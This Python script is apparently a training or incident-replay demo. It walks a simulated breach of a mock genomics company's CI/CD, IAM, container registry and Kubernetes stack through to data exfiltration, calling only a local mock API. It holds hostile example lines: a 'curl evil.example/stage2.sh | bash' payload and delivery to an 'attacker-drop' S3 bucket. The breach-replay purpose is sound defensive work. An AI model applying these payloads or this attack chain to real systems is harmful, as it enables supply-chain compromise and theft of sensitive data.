#!/usr/bin/env python3
"""
Helix — Attacker simulation (hack demo)
Runs the REAL kill-chain against the mock server and prints each step.
Usage:
  python3 app.py            # terminal 1 (server)
  python3 attacker.py       # terminal 2 (this)
  python3 attacker.py --url http://localhost:8471
"""
import json, sys, urllib.request, time

URL = "http://localhost:8471"
if "--url" in sys.argv:
    URL = sys.argv[sys.argv.index("--url") + 1]

def call(method, path, body=None):
    data = json.dumps(body or {}).encode()
    req = urllib.request.Request(URL + path, data=data if method == "POST" else None,
                                 headers={"Content-Type": "application/json"}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:
            return e.code, {"http_error": e.code}

def step(n, title, cmd=""):
    print(f"\n{'='*70}\nSTEP {n}: {title}\n{'='*70}")
    if cmd:
        print(f"$ {cmd}")

def show(resp):
    print(json.dumps(resp, indent=2)[:2200])

def main():
    print("Helix breach replay — attacker view (dummy data, real logic)")
    print(f"Target: {URL}")
    s, h = call("GET", "/health")
    print(f"Server: {h}")
    if s != 200:
        print("Start the server first: python3 app.py"); sys.exit(1)
    call("POST", "/api/reset")

    # 0 recon (passive)
    step(0, "Recon — engineering blog names the exact roles (F1) + public repo takes PRs (F2)",
         "curl -s https://helix.example/blog/scaling-sequencing | grep -i helixdeploy")
    print("Attacker learns: roles HelixDeploy/HelixPipelineOps, federation model, workflow excerpt.")
    print("Attack surface: helix-seqtools public, 41 external PRs in 2026 = cover traffic.")

    # 1 PR
    step(1, "Initial access — throwaway PR triggers pull_request_target BEFORE review (F3/F4/F27)",
         'curl -X POST $URL/api/github/pr -d \'{"author":"seq-fan-2026 (3 days old)","payload":"exfil.sh"}\'')
    s, r = call("POST", "/api/github/pr", {"author": "seq-fan-2026 (created 11 Nov, throwaway)", "repo": "helix-diagnostics/helix-seqtools", "payload": "curl https://evil.example/stage2.sh | bash"})
    show(r)
    oidc_sub = r["oidc"]["sub"]
    print(f"--> OIDC sub minted: {oidc_sub}  (legit-looking, low-trust repo)")

    # 2 assume HelixDeploy
    step(2, "Assume HelixDeploy via org-wide wildcard trust (F5)",
         'curl -X POST $URL/api/iam/assume-deploy -d \'{"oidc_sub":"repo:helix...:pull_request"}\'')
    s, r = call("POST", "/api/iam/assume-deploy", {"oidc_sub": oidc_sub})
    show(r)
    if s != 200:
        print("BLOCKED (fixed mode?) — trust correctly pinned. Demo stops here in hardened mode."); return
    deploy_cred = r["cred_id"]
    print(f"--> Got HelixDeploy creds: {deploy_cred}")

    # 3 runner persistence
    step(3, "Execution on shared self-hosted runner + persistence outside /work (F7/F8)",
         'curl -X POST $URL/api/runner/exec -d \'{"cmd":"...","persist_path":"/opt/runner-env/.cache"}\'')
    s, r = call("POST", "/api/runner/exec", {"cmd": "stage2: steal creds, prep registry push", "persist_path": "/opt/runner-env/.x"})
    show(r)
    print("--> No runtime telemetry (F15): nobody can say what else ran. Permanent blind spot.")

    # 4 chain to PipelineOps
    step(4, "Chain HelixDeploy -> HelixPipelineOps (hop 1, never reviewed end-to-end F25/F26)",
         'curl -X POST $URL/api/iam/assume-chain -d \'{"cred_id":"...","target":"HelixPipelineOps"}\'')
    s, r = call("POST", "/api/iam/assume-chain", {"cred_id": deploy_cred, "target": "HelixPipelineOps"})
    show(r)
    ops_cred = r["cred_id"]

    # 5 poison registry
    step(5, "Supply-chain poisoning — push evil image to mutable 'stable' tag (F9/F10)",
         'curl -X POST $URL/api/registry/push -d \'{"cred_id":"...","tag":"stable"}\'')
    s, r = call("POST", "/api/registry/push", {"cred_id": ops_cred, "tag": "stable"})
    show(r)
    print("--> Pipelines pull by TAG not digest: poison becomes 'current base image' silently.")

    # 6 K8s secret enumeration
    step(6, "Escalation in helix-prod — poisoned pod reads ALL secrets via stale binding (F12/F13/F11)",
         'curl -X POST $URL/api/k8s/list-secrets -d \'{"sa":"pipeline-runner"}\'')
    s, r = call("POST", "/api/k8s/list-secrets", {"sa": "pipeline-runner"})
    show(r)

    # 7 privileged pod
    step(7, "Node breakout — privileged + hostPath '/' pod, no admission control (F14). Alert F20 fires.",
         'curl -X POST $URL/api/k8s/create-pod -d \'{"spec":{"privileged":true,"hostPath":"/"}}\'')
    s, r = call("POST", "/api/k8s/create-pod", {"spec": {"privileged": True, "hostPath": "/", "name": "seq-pipeline-gpu-helper"}})
    show(r)
    if r.get("alert"):
        aid = r["alert"]["id"]
        print(f"--> SOC alert {aid} fires. Analyst closes as 'expected' (90-140 privileged pods/day, F21) without spotting hostPath='/'.")
        s2, r2 = call("POST", "/api/soc/triage", {"alert_id": aid, "verdict": "expected behaviour (privileged is normal)"})
        show(r2)

    # 8 chain to DataExport
    step(8, "Chain HelixPipelineOps -> HelixDataExport (hop 2, F16)",
         'curl -X POST $URL/api/iam/assume-chain -d \'{"cred_id":"...","target":"HelixDataExport"}\'')
    s, r = call("POST", "/api/iam/assume-chain", {"cred_id": ops_cred, "target": "HelixDataExport"})
    show(r)
    exp_cred = r["cred_id"]
    print("--> Real: 41 assumes 17 Nov-9 Jan with NO matching pipeline runs (broken 1:1 invariant).")

    # 9 bulk read
    step(9, "Bulk read of helix-sequences — 31k vs ~2.4k/mo baseline (F18). Alert F22 fires.",
         'curl -X POST $URL/api/export/read -d \'{"cred_id":"...","count":31000}\'')
    # do in chunks to show progression
    bulk_alert = None
    for chunk in [8000, 8000, 8000, 7000]:
        s, r = call("POST", "/api/export/read", {"cred_id": exp_cred, "count": chunk})
        print(f"  read chunk {chunk}: total={r.get('total_read')}")
        if r.get("alert") and not bulk_alert:
            bulk_alert = r["alert"]
            print(f"  --> SOC alert {bulk_alert['id']} fired on bulk read.")
        time.sleep(0.2)
    show(r)
    if bulk_alert:
        aid = bulk_alert["id"]
        print(f"--> SOC alert {aid} fires. Analyst closes as 'month-end batch' with no LIS access to verify (F19/F22/F23).")
        s2, r2 = call("POST", "/api/soc/triage", {"alert_id": aid, "verdict": "consistent with month-end delivery batch"})
        show(r2)
    print(f"--> LIS shows only 4,900 real deliveries; {r.get('total_read',0)-4900} reads have NO business event (F19).")

    # 10 exfil anywhere
    step(10, "Exfiltration — deliver to ATTACKER bucket via unscoped destination param (F17/F31)",
         'curl -X POST $URL/api/export/deliver -d \'{"destination":"s3://attacker-drop/x","count":31000}\'')
    s, r = call("POST", "/api/export/deliver", {"cred_id": exp_cred, "destination": "s3://attacker-drop/helix-cohort", "count": 31000})
    show(r)
    print("--> Real timeline: reads complete 6 Jan (F31) -> public upload 11 Jan via hosting-provider IP (F30) -> spotted by outsider 18 Jan.")

    # 11 distractors
    step(11, "What did NOT matter — ruling out noise (F24/F29)",
         "# no command — this step is absence-of-evidence")
    print("F29: 220k failed logins 2-6 Dec = internet background noise; no long-lived creds exist (F24), so nothing to brute-force.")
    print("F24: no policy change / logging disabled / public bucket / key use — SOC's whole runbook never applied (F23).")
    print("Also out-of-scope: K8s audit invisible to SOC (F32), pentest excluded CI/CD+K8s (F28), 90d vs 400d log gap (F6).")

    s, stats = call("GET", "/api/stats")
    print(f"\n{'='*70}\nFINAL STATS\n{'='*70}")
    print(json.dumps(stats, indent=2))
    print("\nDone. Open the dashboard for visuals: " + URL + "/")
    print("Tip: restart server with FIXED=true python3 app.py and re-run — every step should now DENY.")

if __name__ == "__main__":
    main()
